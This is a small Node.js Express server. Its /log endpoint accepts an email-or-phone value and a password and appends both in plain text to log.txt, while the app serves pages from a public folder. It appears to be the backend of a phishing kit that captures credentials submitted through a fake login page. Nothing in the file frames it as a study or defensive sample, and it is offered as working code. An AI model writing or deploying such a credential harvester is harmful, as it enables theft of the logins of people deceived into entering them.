const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

// Middleware
app.use(express.json());
app.use(express.static('public')); // serves HTML, CSS, JS from /public

// Log email & password to log.txt
app.post('/log', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send('Missing fields');
  }

  const logLine = `Email/Phone: ${email} | Password: ${password}\n`;

  fs.appendFile(path.join(__dirname, 'log.txt'), logLine, err => {
    if (err) {
      console.error('Error writing to file:', err);
      return res.status(500).send('Server error');
    }
    res.send('Logged');
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
app.get('/', (req, res) => {
  res.send('Brooo your server is working with your code!');
});
